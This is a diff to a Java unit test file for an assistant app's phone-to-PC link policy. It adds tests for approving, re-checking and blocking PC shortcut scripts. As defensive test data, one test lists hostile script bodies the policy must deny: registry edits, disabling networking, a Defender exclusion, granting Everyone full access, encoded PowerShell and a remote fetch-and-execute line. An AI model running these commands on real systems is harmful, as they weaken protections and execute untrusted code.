@@ -182,7 +182,8 @@ public class LinkPolicyTest {
         assertEquals(Cat.HARMLESS, LinkPolicy.phoneCat("flashlight"));
         assertEquals(Cat.QUERY, LinkPolicy.phoneCat("status"));
         assertEquals(Cat.UNKNOWN, LinkPolicy.phoneCat("rm_rf"));
-        assertEquals(Cat.RUN_WS_SCRIPT, LinkPolicy.pcCat("shortcut_run"));
+        assertEquals("电脑快捷指令单独一类", Cat.SHORTCUT, LinkPolicy.pcCat("shortcut_run"));
+        assertEquals(Cat.RUN_WS_SCRIPT, LinkPolicy.pcCat("script_run"));
         assertEquals(Cat.POWER, LinkPolicy.pcCat("shutdown"));
         assertEquals(Cat.SIMPLE_SETTING, LinkPolicy.pcCat("volume"));
         assertEquals("电脑端没登记的新指令一律不认", Cat.UNKNOWN, LinkPolicy.pcCat("format_c"));
@@ -560,6 +561,97 @@ public class LinkPolicyTest {
         assertEquals(PcRx.CONFIRM_TIMEOUT, box.await(9999, 10));
     }
 
+    // ------------------------------------------------------------------ 电脑快捷指令（SHORTCUT）
+
+    static Facts sc(boolean listed, boolean approved, boolean changed, String blocked) {
+        Facts f = new Facts();
+        f.shortcutListed = listed;
+        f.shortcutApproved = approved;
+        f.shortcutChanged = changed;
+        f.shortcutBlocked = blocked;
+        return f;
+    }
+
+    @Test public void shortcutMatrix() {
+        Object[][] rows = {
+                {sc(false, false, false, ""), D, D, D, LinkPolicy.R_UNKNOWN},
+                {sc(true, false, false, ""), D, C, C, LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL},
+                {sc(true, false, true, ""), D, C, C, LinkPolicy.R_SHORTCUT_CHANGED},
+                {sc(true, true, false, ""), D, A, A, ""},
+                {sc(true, true, false, "内容涉及注册表"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED},
+                {sc(true, false, false, "内容涉及授予权限"), D, D, D, LinkPolicy.R_SHORTCUT_BLOCKED}};
+        for (Object[] r : rows) {
+            Facts f = (Facts) r[0];
+            Decision ro = LinkPolicy.decide(Target.PC, RO, Cat.SHORTCUT, f);
+            assertEquals(r[1], ro.verdict);
+            assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, ro.reason);
+            Decision au = LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, f), fu = LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, f);
+            assertEquals(r[2], au.verdict);
+            assertEquals(r[3], fu.verdict);
+            assertEquals(r[4], au.reason);
+            assertEquals(r[4], fu.reason);
+        }
+        assertEquals("没有事实 = 不在列表里", D, v(Target.PC, FU, Cat.SHORTCUT));
+        assertEquals(Cat.UNKNOWN, LinkPolicy.phoneCat("shortcut_run"));
+        for (String code : new String[]{LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, LinkPolicy.R_SHORTCUT_CHANGED, LinkPolicy.R_SHORTCUT_BLOCKED})
+            assertFalse(code, LinkPolicy.reasonZh(code).isEmpty());
+        assertEquals("shortcut_needs_approval", LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL);
+        assertEquals("shortcut_changed", LinkPolicy.R_SHORTCUT_CHANGED);
+        assertEquals("shortcut_category_blocked", LinkPolicy.R_SHORTCUT_BLOCKED);
+    }
+
+    @Test public void shortcutHashResetAndApprovalTable() throws Exception {
+        byte[] body = "Start-Process notepad".getBytes("UTF-8");
+        String h = LinkPolicy.sha256Hex(body);
+        Map<String, String> ap = new TreeMap<String, String>();
+        Facts f = LinkPolicy.shortcutFacts("Mode.ps1", body, ap, true);
+        assertTrue(f.shortcutListed && !f.shortcutApproved && !f.shortcutChanged);
+        assertEquals(C, LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, f).verdict);
+        ap.put(LinkPolicy.shortcutId("Mode.ps1"), f.shortcutHash); // 「以后直接执行」
+        f = LinkPolicy.shortcutFacts("mode.PS1", body, ap, true);
+        assertTrue(f.shortcutApproved);
+        assertEquals(A, LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, f).verdict);
+        assertEquals(A, LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, f).verdict);
+        assertEquals(D, LinkPolicy.decide(Target.PC, RO, Cat.SHORTCUT, f).verdict);
+        // 改内容 → 哈希对不上 → 重新问
+        Facts ch = LinkPolicy.shortcutFacts("mode.ps1", "Start-Process calc".getBytes("UTF-8"), ap, true);
+        assertTrue(!ch.shortcutApproved && ch.shortcutChanged);
+        assertEquals(LinkPolicy.R_SHORTCUT_CHANGED, LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, ch).reason);
+        // 撤销 = 从表里拿掉 → 又是第一次
+        ap.remove("mode.ps1");
+        assertEquals(LinkPolicy.R_SHORTCUT_NEEDS_APPROVAL, LinkPolicy.decide(Target.PC, AU, Cat.SHORTCUT, LinkPolicy.shortcutFacts("mode.ps1", body, ap, true)).reason);
+        // 存取
+        Map<String, String> m = new java.util.LinkedHashMap<String, String>();
+        m.put("下班 模式,a=b.ps1", h);
+        m.put("x.bat", LinkPolicy.sha256Hex(new byte[]{1}));
+        assertEquals(m, LinkPolicy.parseApprovals(LinkPolicy.formatApprovals(m)));
+        assertEquals(m, LinkPolicy.parseApprovals(LinkPolicy.formatApprovals(m) + ",bad=zz,noeq,=" + h));
+        assertEquals("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", LinkPolicy.sha256Hex(new byte[0]));
+    }
+
+    @Test public void shortcutBlockedBodies() throws Exception {
+        String[] bad = {"reg add HKCU\\Software\\X /v a /d 1 /f", "Set-ItemProperty -Path HKCU:\\Software\\X -Name a -Value 1",
+                "netsh interface set interface Wi-Fi disable", "Set-DnsClientServerAddress -InterfaceAlias Wi-Fi -ServerAddresses 1.1.1.1",
+                "Stop-Service wuauserv", "sc.exe delete foo", "icacls C:\\x /grant Everyone:F", "Add-MpPreference -ExclusionPath C:\\",
+                "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "iex (irm https://example.com/a.ps1)"};
+        Map<String, String> ap = new TreeMap<String, String>();
+        for (String b : bad) {
+            byte[] body = b.getBytes("UTF-8");
+            ap.put("s.ps1", LinkPolicy.sha256Hex(body)); // 就算批准表里有它
+            Facts f = LinkPolicy.shortcutFacts("s.ps1", body, ap, true);
+            assertFalse(b, f.shortcutBlocked.isEmpty());
+            assertFalse(b, f.shortcutApproved);
+            for (Level l : Level.values()) assertEquals(b + " " + l, D, LinkPolicy.decide(Target.PC, l, Cat.SHORTCUT, f).verdict);
+            Decision d = LinkPolicy.decide(Target.PC, FU, Cat.SHORTCUT, f);
+            assertEquals(LinkPolicy.R_SHORTCUT_BLOCKED, d.reason);
+            assertTrue(d.text, d.text.contains(f.shortcutBlocked));
+        }
+        byte[] u16 = "\uFEFFreg add HKCU\\X /f".getBytes("UTF-16LE");
+        assertFalse("UTF-16 存的也认得出", LinkPolicy.shortcutFacts("p.bat", u16, null, true).shortcutBlocked.isEmpty());
+        for (String ok : new String[]{"Start-Process notepad", "explorer.exe D:\\照片", "@echo off\r\nstart \"\" \"C:\\Program Files\\VS Code\\Code.exe\"\r\n"})
+            assertEquals(ok, "", LinkPolicy.shortcutBodyBlocked(ok));
+    }
+
     @Test public void wiringAndroidSide() throws Exception {
         String root = System.getProperty("bixby.root", ".");
         String rx = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcRxAndroid.java").toPath()), "UTF-8");
@@ -573,6 +665,7 @@ public class LinkPolicyTest {
         String ui = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/PcLinkUi.java").toPath()), "UTF-8");
         assertTrue(ui.contains("buildLevel(host, root, act);"));
         assertTrue("完全访问要二次确认", ui.contains("打开完全访问？") && ui.contains("我了解风险，打开"));
+        assertTrue("快捷指令可能要电脑上批准：手机多等", ui.contains("cat == LinkPolicy.Cat.SHORTCUT"));
         String lp = new String(Files.readAllBytes(new File(root, "app/src/com/onesay/assistant/v2/pclink/LinkPolicy.java").toPath()), "UTF-8");
         java.util.regex.Matcher lm = java.util.regex.Pattern.compile("\"([^\"\\\\]|\\\\.)*\"").matcher(lp);
         while (lm.find()) assertFalse(lm.group(), lm.group().contains("Bixby") || lm.group().contains("三星"));
